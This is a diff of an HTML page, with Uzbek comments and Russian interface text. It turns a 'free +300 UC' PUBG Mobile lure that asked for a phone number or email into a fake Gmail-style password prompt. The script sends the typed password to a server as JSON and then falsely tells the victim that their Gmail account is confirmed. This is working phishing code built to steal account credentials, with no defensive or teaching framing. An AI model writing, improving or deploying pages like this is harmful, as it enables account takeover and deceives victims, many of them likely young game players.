@@ -1,16 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chat</title>
+    <title>Password</title>
 
-    <!-- Telefon uchun muhim -->
+    <!-- TELEFON UCHUN -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <style>
         body {
             margin: 0;
             height: 100vh;
-            background: url("https://upload.wikimedia.org/wikipedia/ru/thumb/7/7e/PlayerUnknown%27s_Battlegrounds_Mobile.jpg/960px-PlayerUnknown%27s_Battlegrounds_Mobile.jpg") no-repeat center center/cover;
+            background: url("https://static3.tgstat.ru/channels/_0/84/84149ba14092fab307e0cf55c791a8a1.jpg") no-repeat center center;
+            background-size: cover;
             font-family: 'Roboto', Arial, sans-serif;
             display: flex;
             justify-content: center;
@@ -29,19 +30,16 @@
             flex: 1;
         }
 
-        .logo {
-            font-size: 28px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            margin-left: -20px;
-        }
-
         .title {
             font-size: 32px;
         }
 
-        .subtitle {
-            color: #9aa0a6;
+        .email {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #5f6368;
+            border-radius: 20px;
+            display: inline-block;
         }
 
         .right {
@@ -51,25 +49,35 @@
             justify-content: center;
         }
 
+        /* 🔥 YANGILANGAN INPUT */
         input {
             width: 100%;
             padding: 16px;
-            border: 1px solid #5f6368;
-            border-radius: 6px;
-            background: rgba(0,0,0,0.5); /* 🔥 biroz qoraytirildi o‘qilishi uchun */
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.6); /* qoraroq fon */
+            border: 2px solid rgba(255, 255, 255, 0.3);
             color: white;
-            font-size: 16px;
+            font-size: 18px;
             outline: none;
+            backdrop-filter: blur(5px);
+            box-shadow: 0 0 10px rgba(0,0,0,0.7);
+        }
+
+        input::placeholder {
+            color: rgba(255,255,255,0.7);
         }
 
         input:focus {
             border: 2px solid #8ab4f8;
+            box-shadow: 0 0 15px #8ab4f8;
+            background: rgba(0, 0, 0, 0.8);
         }
 
         .bottom {
             margin-top: 30px;
             display: flex;
             justify-content: flex-end;
+            gap: 20px;
         }
 
         button {
@@ -80,13 +88,8 @@
             cursor: pointer;
         }
 
-        /* 📱 TELEFON UCHUN */
+        /* 📱 TELEFON UCHUN MOSLASH */
         @media (max-width: 768px) {
-            body {
-                align-items: flex-start;
-                padding: 20px;
-            }
-
             .main {
                 width: 100%;
                 height: auto;
@@ -94,17 +97,19 @@
                 padding: 20px;
             }
 
-            .left {
-                margin-bottom: 30px;
+            .left, .right {
+                width: 100%;
             }
 
             .title {
                 font-size: 24px;
+                text-align: center;
             }
 
-            input {
-                font-size: 14px;
-                padding: 14px;
+            .email {
+                display: block;
+                text-align: center;
+                margin: 15px auto;
             }
 
             .bottom {
@@ -113,7 +118,6 @@
 
             button {
                 width: 100%;
-                padding: 12px;
             }
         }
     </style>
@@ -124,38 +128,41 @@
 <div class="main">
 
     <div class="left">
-        <div class="logo">
-            бесплатно +300 uc✅
-            <img src="https://i.playerok.com/j5WEQwfdF86Ut0cSVqOFJgcoockGJ5jiEsE9nwI043c/wm:0.8:soea:5:2:0.2/rs:fill:0:1000:0/g:no/quality:99/czM6Ly9wbGF5ZXJvay8vaW1hZ2VzLzFmMDg3ZWYwLTVlMTktNmExMC1jNWE4LWQwODM1N2E1YmQzYi5qcGVn.jpg" 
-                 style="width:30px; height:30px; vertical-align:middle; margin-left:5px;">
-        </div>
+        <div class="title">Добро пожаловать!</div>
+        <div class="email">user@gmail.com</div>
     </div>
 
     <div class="right">
 
-        <div style="margin-bottom:10px; color:#8ab4f8; font-size:14px;">
-            +60 uc bonus🎁
+        <input id="msg2" type="password" placeholder="Введите пароль">
+
+        <div style="margin-top:10px;">
+            <input type="checkbox" onclick="toggle()"> Показать пароль
         </div>
 
-        <input id="msg" placeholder="Телефон или эл. почта." autocomplete="on">
-
         <div class="bottom">
-            <button onclick="send()">Далее</button>
+            <button onclick="send2()">Далее</button>
         </div>
 
     </div>
+
 </div>
 
 <script>
 window.onload = () => {
-    document.getElementById("msg").focus();
+    document.getElementById("msg2").focus();
 };
 
-function send() {
-    const message = document.getElementById("msg").value;
+function toggle() {
+    const input = document.getElementById("msg2");
+    input.type = input.type === "password" ? "text" : "password";
+}
+
+function send2() {
+    const message = document.getElementById("msg2").value;
 
     if (!message) {
-        alert("Email yoz!");
+        alert("Введите пароль");
         return;
     }
 
@@ -165,7 +172,7 @@ function send() {
         body: JSON.stringify({ message })
     })
     .then(() => {
-        window.location.href = "/page2.html";
+        alert("Ваш аккаунт Gmail подтверждён");
     });
 }
 </script>
